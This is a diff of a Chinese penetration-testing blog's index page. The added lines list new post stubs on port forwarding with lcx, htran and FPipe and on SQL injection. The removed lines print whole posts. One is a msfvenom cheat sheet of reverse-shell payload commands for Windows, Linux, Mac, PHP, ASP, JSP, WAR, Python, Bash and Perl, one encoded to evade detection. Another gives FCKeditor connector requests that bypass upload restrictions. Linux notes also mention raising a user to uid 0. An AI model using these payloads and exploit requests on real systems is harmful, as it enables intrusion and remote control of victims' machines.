@@ -148,7 +148,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Windows/" style="font-size: 15px;">Windows</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/kali-Hydra/" style="font-size: 10px;">kali Hydra</a> <a href="/tags/lcx/" style="font-size: 10px;">lcx</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/msfvenom/" style="font-size: 10px;">msfvenom</a> <a href="/tags/nc/" style="font-size: 15px;">nc</a> <a href="/tags/portscan/" style="font-size: 10px;">portscan</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/reduh/" style="font-size: 10px;">reduh</a> <a href="/tags/zip/" style="font-size: 10px;">zip</a> <a href="/tags/内网/" style="font-size: 15px;">内网</a> <a href="/tags/反弹shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/多线程/" style="font-size: 10px;">多线程</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/渗透/" style="font-size: 15px;">渗透</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/爆破/" style="font-size: 10px;">爆破</a> <a href="/tags/端口扫描/" style="font-size: 10px;">端口扫描</a>
+                        <a href="/tags/SOCKS/" style="font-size: 10px;">SOCKS</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/fpipe/" style="font-size: 12.5px;">fpipe</a> <a href="/tags/htran/" style="font-size: 10px;">htran</a> <a href="/tags/kali/" style="font-size: 10px;">kali</a> <a href="/tags/kali-Hydra/" style="font-size: 10px;">kali Hydra</a> <a href="/tags/lcx/" style="font-size: 12.5px;">lcx</a> <a href="/tags/linux/" style="font-size: 12.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/metinfo/" style="font-size: 10px;">metinfo</a> <a href="/tags/msfvenom/" style="font-size: 10px;">msfvenom</a> <a href="/tags/nc/" style="font-size: 12.5px;">nc</a> <a href="/tags/portscan/" style="font-size: 10px;">portscan</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/reduh/" style="font-size: 10px;">reduh</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 12.5px;">sql注入</a> <a href="/tags/zip/" style="font-size: 10px;">zip</a> <a href="/tags/代理/" style="font-size: 10px;">代理</a> <a href="/tags/内网/" style="font-size: 17.5px;">内网</a> <a href="/tags/反弹shell/" style="font-size: 10px;">反弹shell</a> <a href="/tags/多线程/" style="font-size: 10px;">多线程</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/渗透/" style="font-size: 20px;">渗透</a> <a href="/tags/漏洞/" style="font-size: 15px;">漏洞</a> <a href="/tags/爆破/" style="font-size: 10px;">爆破</a> <a href="/tags/端口扫描/" style="font-size: 10px;">端口扫描</a>
                     </div>
                 </section>
                 
@@ -162,7 +162,7 @@
                     
                       <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ichunqiu.com">i春秋</a>
                     
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.freebuf.com">FreeBuf</a>
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.freebuf.com">FreeBuf</a>
                     
                       <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">phith0n</a>
                     
@@ -236,6 +236,286 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-FPipe端口转发使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/30/FPipe端口转发使用/" class="article-date">
+      <time datetime="2017-08-30T12:42:26.328Z" itemprop="datePublished">2017-08-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2017/08/30/FPipe端口转发使用/">FPipe进行端口重定向使用方法</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              r1b00t|fpipe
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a><a class="article-category-link" href="/categories/Web渗透/nw/">nw</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fpipe/">fpipe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网/">内网</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a   href="/2017/08/30/FPipe端口转发使用/#more">查看更多 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-内网渗透端口转发和代理软件" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/30/内网渗透端口转发和代理软件/" class="article-date">
+      <time datetime="2017-08-30T12:39:44.870Z" itemprop="datePublished">2017-08-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2017/08/30/内网渗透端口转发和代理软件/">内网渗透所需要的端口转发和代理软件的使用</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              r1b00t|lcx|htran
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a><a class="article-category-link" href="/categories/Web渗透/nw/">nw</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SOCKS/">SOCKS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fpipe/">fpipe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/htran/">htran</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lcx/">lcx</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代理/">代理</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网/">内网</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a   href="/2017/08/30/内网渗透端口转发和代理软件/#more">查看更多 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Metinfo5.3.17前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/30/Metinfo5.3.17前台sql注入/" class="article-date">
+      <time datetime="2017-08-30T09:27:45.627Z" itemprop="datePublished">2017-08-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2017/08/30/Metinfo5.3.17前台sql注入/">Fck编辑器漏洞</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              r1b00t|metinfo|sql注入
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metinfo/">metinfo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a   href="/2017/08/30/Metinfo5.3.17前台sql注入/#more">查看更多 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-sql注入笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2017/08/30/sql注入笔记/" class="article-date">
+      <time datetime="2017-08-30T09:08:52.268Z" itemprop="datePublished">2017-08-30</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2017/08/30/sql注入笔记/">Sql注入笔记</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              r1b00t|sql注入|sql
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web渗透/">Web渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a   href="/2017/08/30/sql注入笔记/#more">查看更多 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
   
     <article id="post-python编写简单端口扫描" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -669,298 +949,6 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali-Hydra/">kali Hydra</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ThinkPHP2.1命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2017/08/29/ThinkPHP2.1命令执行漏洞/" class="article-date">
-      <time datetime="2017-08-29T07:55:36.318Z" itemprop="datePublished">2017-08-29</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2017/08/29/ThinkPHP2.1命令执行漏洞/">ThinkPHP2.1命令执行漏洞</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              r1b00t|Thinkphp2.1|命令执行
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/vuln/">vuln</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2017/08/29/ThinkPHP2.1命令执行漏洞/#more">查看更多 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-linux学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2017/08/29/linux学习笔记/" class="article-date">
-      <time datetime="2017-08-29T07:51:52.777Z" itemprop="datePublished">2017-08-29</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2017/08/29/linux学习笔记/">Linux学习笔记</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="Linux学习笔记"><a href="#Linux学习笔记" class="headerlink" title="Linux学习笔记"></a>Linux学习笔记</h1><h2 id="查看系统版本"><a href="#查看系统版本" class="headerlink" title="查看系统版本"></a>查看系统版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1、uname -a </div><div class="line">Linux zng-virtual-machine 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:27 UT</div><div class="line"></div><div class="line">    4 代表是大版本</div><div class="line">    2 代表次版本  如何为奇数则代表为测试版本   会不稳定</div><div class="line">2、lsb_release -a</div><div class="line">    No LSB modules are available.</div><div class="line">    Distributor ID:	Ubuntu</div><div class="line">    Description:	Ubuntu 14.04.5 LTS</div><div class="line">    Release:	14.04</div><div class="line">    Codename:	trusty</div></pre></td></tr></table></figure>
-<h2 id="3、ssh连接"><a href="#3、ssh连接" class="headerlink" title="3、ssh连接"></a>3、ssh连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server</div><div class="line"></div><div class="line">vim /etc/ssh/sshd_cofig</div><div class="line"></div><div class="line">PermitRootLogin yes   //允许root用户登陆</div><div class="line"></div><div class="line">/etc/init.d/ssh restart //重启ssh</div><div class="line"></div><div class="line">禁止人家使用ssh端口登录就行了，具体方法</div><div class="line">：</div><div class="line">sudo vi /etc/ssh/sshd_config</div><div class="line"></div><div class="line">查找 AllowUsers ，如果没有则加上。</div><div class="line">AllowUsers meiking root</div><div class="line"></div><div class="line">上面表达的意思就是只允许meiking和root用户远程登录</div></pre></td></tr></table></figure>
-<h2 id="4、ftp链接"><a href="#4、ftp链接" class="headerlink" title="4、ftp链接"></a>4、ftp链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">apt-get install vsftp   //安装vsftp</div><div class="line">sudo mkdir /home/uftp   //建立ftp用户目录</div><div class="line">sudo useradd -d /home/uftp -s /bin/bash uftp    新建uftp用户   </div><div class="line">sudo passwd uftp    //修改uftp密码</div><div class="line">打开&quot;终端窗口&quot;，输入&quot;sudo gedit /etc/vsftpd.conf&quot;--&gt;回车--&gt;打开了vsftpd.conf文件，向文件中添加&quot;userlist_deny=NO   添加规则</div><div class="line">userlist_enable=YES userlist_file=/etc/allowed_users&quot;和&quot;seccomp_sandbox=NO&quot;--&gt;使文件中的&quot;local_enable=YES&quot;--&gt;保存。</div><div class="line">sudo gedit /etc/allowed_users  输入uftp</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">5、touch </div><div class="line">    touch -r 文件     更新时间戳</div><div class="line">6、echo 写shell </div><div class="line">    echo &quot;&quot; &gt; 文件</div><div class="line"></div><div class="line">7、nano 文件</div><div class="line">8、gedit 文件</div><div class="line">9、less  文件    可以上下翻页查看  </div><div class="line">  /搜索</div><div class="line">      	q退出</div><div class="line">10、cat  文件   //查看                  </div><div class="line">     cat -b 文件    //带序号 查看文件</div><div class="line">11、tail 文件  可以实时显示文件 </div><div class="line">  tail -f 文件名    实时显示文件最后的内容  </div><div class="line">  tail -n 显示行数</div><div class="line">12、head 文件  显示文档的开头</div><div class="line">  head -c 文件    显示字节数</div><div class="line">13、ctrl +l 清屏   或者  clear 清屏</div><div class="line">14、wc 文件    统计文件内容的单词数</div><div class="line"></div><div class="line">    第一个 1 代表总行数</div><div class="line">    第二个 1 代表单词数</div><div class="line">    第三个 8 代表占的字节数 即文件大小</div><div class="line">    第四个1.txt  代表文件名</div><div class="line">15、cp 文件  目的路径 </div><div class="line">    cp -r 文件  目的路径  复制目录</div><div class="line">16、linux标准流</div><div class="line">    标准输入流    描述符 0 </div><div class="line">    标准输出流    描述符 1</div><div class="line">    标准错误流    描述符 2</div><div class="line">    eg: find / -name &quot;php&quot; 2&gt;/dev/null</div><div class="line">17、cd  目录  </div><div class="line">    cd ~ 进入家/主目录</div><div class="line">    cd - 退回到上一次的目录</div><div class="line">    cd  不加参数 可以直接进入当前家的主目录</div><div class="line">18、chmod </div><div class="line"></div><div class="line">    r  写  4 </div><div class="line">    w 读   2 </div><div class="line">    x  执行  1 </div><div class="line">    s  特殊权限</div><div class="line"></div><div class="line">    chmod a-x 文件 </div><div class="line">    chmod -R </div><div class="line">19、whice  </div><div class="line">    20、如果ifconfig不能使用 则可以使用/sbin/ifconfig使用 这个是临时生效</div><div class="line">    如果长期生效，则需要在/etc/profile 末尾添加 以下代码来永久生效</div><div class="line">    export PATH=$PATH:/sbin</div><div class="line">21、grep	</div><div class="line">    -v  反转查询</div><div class="line">    -n  输出行号</div><div class="line">    -l 输出匹配的行所在的文件名</div><div class="line">     	22、sort</div><div class="line">    -n 按照数字大小排序  -n 会忽略空格或者tab缩进</div><div class="line">    -r 降序排序  sort默认升序</div><div class="line">    -f 不区分大小写</div><div class="line">23、ps</div><div class="line">    -a 显示所有的用户进程</div><div class="line">    -x 显示无终端的进程</div><div class="line">    -u 显示更多的信息</div><div class="line">    -e 显示所有进程</div><div class="line">    常用 ps -aux</div><div class="line">    uid 进程所属用户id</div><div class="line">    pid 进程id</div><div class="line">    ppid 父进程id</div><div class="line">    C CPU使用率</div><div class="line">24、kill 命令</div><div class="line">    kill -9 pid</div><div class="line">25、FTP</div><div class="line">    连接：ftp  hostname </div><div class="line">    命令:</div><div class="line">    put filename  本地上传文件到服务器</div><div class="line">    get filename  服务器下载文件到本地</div><div class="line">    mput filelist  多文件上传</div><div class="line">    mget filelist  多文件下载</div><div class="line">    dir   列出所有文件</div><div class="line">    cd 改变远程目录</div><div class="line">    lcd 本地目录</div><div class="line"></div><div class="line">26、df命令</div><div class="line">    df -k 全盘使用的情况</div><div class="line">27、usemod -u 0 -g 用户组   修改用户权限  将用户权限设置为0</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/linux/">linux</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-msfvenom生成shell" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2017/08/29/msfvenom生成shell/" class="article-date">
-      <time datetime="2017-08-29T07:46:23.042Z" itemprop="datePublished">2017-08-29</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2017/08/29/msfvenom生成shell/">msfvenom生成shell</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="Msfvenome-生成各种shell"><a href="#Msfvenome-生成各种shell" class="headerlink" title="Msfvenome 生成各种shell"></a>Msfvenome 生成各种shell</h1><h2 id="生成32位exe"><a href="#生成32位exe" class="headerlink" title="生成32位exe"></a>生成32位exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.106 LPORT=1234 -f exe &gt; ./test.exe</div></pre></td></tr></table></figure>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h5 id="msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-LPORT-f-elf-gt-shell-elf"><a href="#msfvenom-p-linux-x86-meterpreter-reverse-tcp-LHOST-LPORT-f-elf-gt-shell-elf" class="headerlink" title="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf"></a>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f elf &gt; shell.elf</your></your></h5><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
-<h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure>
-<h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
-<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
-<h2 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
-<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
-<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
-<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/kali/">kali</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msfvenom/">msfvenom</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-FCK编辑器漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2017/08/29/FCK编辑器漏洞/" class="article-date">
-      <time datetime="2017-08-29T07:41:03.142Z" itemprop="datePublished">2017-08-29</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2017/08/29/FCK编辑器漏洞/">Fck编辑器漏洞</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="Fck编辑器漏洞"><a href="#Fck编辑器漏洞" class="headerlink" title="Fck编辑器漏洞"></a>Fck编辑器漏洞</h1><h3 id="版本2-6-6"><a href="#版本2-6-6" class="headerlink" title="版本2.6.6"></a>版本2.6.6</h3><h5 id="1、突破-变-限制"><a href="#1、突破-变-限制" class="headerlink" title="1、突破.变_限制"></a>1、突破.变_限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/0x7e.asp&amp;NewFolderName=z&amp;uuid=1244789975684</div></pre></td></tr></table></figure>
-<h5 id="2、上传界面"><a href="#2、上传界面" class="headerlink" title="2、上传界面"></a>2、上传界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/0x7e.asp&amp;NewFolderName=z&amp;uuid=1244789975684</div><div class="line"></div><div class="line">FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)</div></pre></td></tr></table></figure>
-<h5 id="上传地址"><a href="#上传地址" class="headerlink" title="上传地址"></a>上传地址</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.20.243/fck266/editor/filemanager/connectors/uploadtest.html</div></pre></td></tr></table></figure>
